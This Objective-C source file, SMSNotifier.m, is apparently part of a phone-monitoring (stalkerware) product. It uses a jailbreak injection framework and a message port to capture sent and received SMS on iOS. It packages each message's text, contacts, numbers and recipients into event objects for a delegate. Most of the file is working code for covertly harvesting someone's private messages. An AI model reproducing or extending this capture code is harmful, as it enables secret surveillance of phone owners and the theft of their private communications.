//
//  SMSNotifier.m
//  SMSCaptureManager
//
//  Created by Makara Khloth on 2/6/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "SMSNotifier.h"
#import "SMSCaptureDAO.h"
#import "TelephonyNotificationManager.h"
#import "FxSmsEvent.h"
#import "CTMessageCenter.h"
#import "DefStd.h"

@interface SMSNotifier (private)
- (void) messageReceived: (NSNotification *) aNotification;
- (void) messageSent: (NSNotification *) aNotification;
- (void) createSMSEvents;
- (void) createSMSEvent: (NSInteger) aROWID;
@end

@implementation SMSNotifier

@synthesize mDelegate, mEventsSelector, mEventSelector;

- (id) initWithTelephonyNotificationManager: (id <TelephonyNotificationManager>) aTelephonyNotificationManager {
	if ((self = [super init])) {
		mTelephonyNotificationManager = aTelephonyNotificationManager;
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kSMSMessagePortIOS6plus
												 withMessagePortIPCDelegate:self];
		mSMSInfoArray = [[NSMutableArray alloc] init];
	}
	return (self);
}

- (void) start {
	// Outgoing
//	[mTelephonyNotificationManager addNotificationListener:self
//											  withSelector:@selector(messageSent:)
//										   forNotification:KSMSMESSAGESENTNOTIFICATION];
	// Incoming
//	[mTelephonyNotificationManager addNotificationListener:self
//											  withSelector:@selector(messageReceived:)
//										   forNotification:KSMSMESSAGERECEIVEDNOTIFICATION];
	// Outgoing (capture rowID in mobile substrate)
	[mMessagePortReader start];
	// Incoming capture in SMSCaptureManager (also from mobile substrate)
}

- (void) stop {
	// Outgoing
//	[mTelephonyNotificationManager removeListner:self withName:KSMSMESSAGESENTNOTIFICATION];
	// Incoming
//	[mTelephonyNotificationManager removeListner:self withName:KSMSMESSAGERECEIVEDNOTIFICATION];
	// Outgoing (capture rowID in mobile substrate)
	[mMessagePortReader stop];
	// Incoming capture in SMSCaptureManager (also from mobile substrate)
}

#pragma mark -
#pragma mark MessagePortIPCReader delegate
#pragma mark -

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog (@"SMS rowID data = %@", aRawData);
	NSInteger rowID = 0;
	if (aRawData) {
		[aRawData getBytes:&rowID length:sizeof(NSInteger)];
		DLog (@"SMS sent with rowID = %d", rowID);
		
		[self createSMSEvent:rowID];
	}
}

- (void) messageReceived: (NSNotification *) aNotification {
	DLog (@"Message received notification = %@", aNotification);
	NSDictionary *userInfo = [aNotification userInfo];
	NSNumber *kCTMessageTypeKey = [userInfo objectForKey:@"kCTMessageTypeKey"];
	if ([kCTMessageTypeKey intValue] == 1) { // SMS
		NSMutableDictionary *smsInfo = [[NSMutableDictionary alloc] initWithDictionary:userInfo];
		[smsInfo setObject:[NSNumber numberWithInt:kEventDirectionIn] forKey:@"kFxMessageDirectionKey"];
		[mSMSInfoArray addObject:smsInfo];
		[smsInfo release];
		
		[NSObject cancelPreviousPerformRequestsWithTarget:self];
		[self performSelector:@selector(createSMSEvents) withObject:nil afterDelay:0.1];
	} else if ([kCTMessageTypeKey intValue] == 2) { // MMS
		// Handle in mms capture manager
	}
}

// Send failed does not get the notification ... :)
- (void) messageSent: (NSNotification *) aNotification {
	DLog (@"Message sent notification = %@", aNotification);
	NSDictionary *userInfo = [aNotification userInfo];
	NSNumber *kCTMessageTypeKey = [userInfo objectForKey:@"kCTMessageTypeKey"];
	if ([kCTMessageTypeKey intValue] == 1) { // SMS
		NSMutableDictionary *smsInfo = [[NSMutableDictionary alloc] initWithDictionary:userInfo];
		[smsInfo setObject:[NSNumber numberWithInt:kEventDirectionOut] forKey:@"kFxMessageDirectionKey"];
		[mSMSInfoArray addObject:smsInfo];
		[smsInfo release];
		
		[NSObject cancelPreviousPerformRequestsWithTarget:self];
		[self performSelector:@selector(createSMSEvents) withObject:nil afterDelay:0.1];
	} else if ([kCTMessageTypeKey intValue] == 2) { // MMS
		// Handle in mms capture manager
	}
}

- (void) createSMSEvents {
	SMSCaptureDAO *smsDAO = [[SMSCaptureDAO alloc] init];
	NSArray *smsEvents = [smsDAO selectSMSEvents:[mSMSInfoArray count]];
	[mSMSInfoArray removeAllObjects];
	if ([mDelegate respondsToSelector:mEventsSelector]) {
		[mDelegate performSelector:mEventsSelector withObject:smsEvents];
	}
	[smsDAO release];
	
	DLog (@"SMS events = %@", smsEvents);
	DLog (@"statusOfOutgoingMessages = %@", [[CTMessageCenter sharedMessageCenter] statusOfOutgoingMessages]);
}

- (void) createSMSEvent: (NSInteger) aROWID {
	SMSCaptureDAO *smsDAO = [[SMSCaptureDAO alloc] init];
	FxSmsEvent *smsEvent = [smsDAO selectSMSEvent:aROWID];
	
	if ([smsEvent direction] == kEventDirectionOut) {
		// Decompose sms event
		for (FxRecipient *recipient in [smsEvent recipientArray]) {
			FxSmsEvent *cloneSMSEvent = [[FxSmsEvent alloc] init];
			[cloneSMSEvent setEventId:[smsEvent eventId]];
			[cloneSMSEvent setDateTime:[smsEvent dateTime]];
			[cloneSMSEvent setContactName:[smsEvent contactName]];
			[cloneSMSEvent setSenderNumber:[smsEvent senderNumber]];
			[cloneSMSEvent setSmsSubject:[smsEvent smsSubject]];
			[cloneSMSEvent setSmsData:[smsEvent smsData]];
			[cloneSMSEvent setDirection:[smsEvent direction]];
			[cloneSMSEvent setMConversationID:[smsEvent mConversationID]];
			[cloneSMSEvent addRecipient:recipient];
			if ([mDelegate respondsToSelector:mEventSelector]) {
				[mDelegate performSelector:mEventSelector withObject:cloneSMSEvent];
			}
			[cloneSMSEvent release];
		}
	} else {
		if ([mDelegate respondsToSelector:mEventSelector]) {
			[mDelegate performSelector:mEventSelector withObject:smsEvent];
		}
	}
	[smsDAO release];
	
	DLog (@"SMS event = %@", smsEvent);
}

- (void) release {
	[NSObject cancelPreviousPerformRequestsWithTarget:self];
	[super release];
}

- (void) dealloc {	
	DLog (@"SMSNotifier release")
	[self stop];
	[mMessagePortReader release];	
	[mSMSInfoArray release];
	[super dealloc];
}

@end
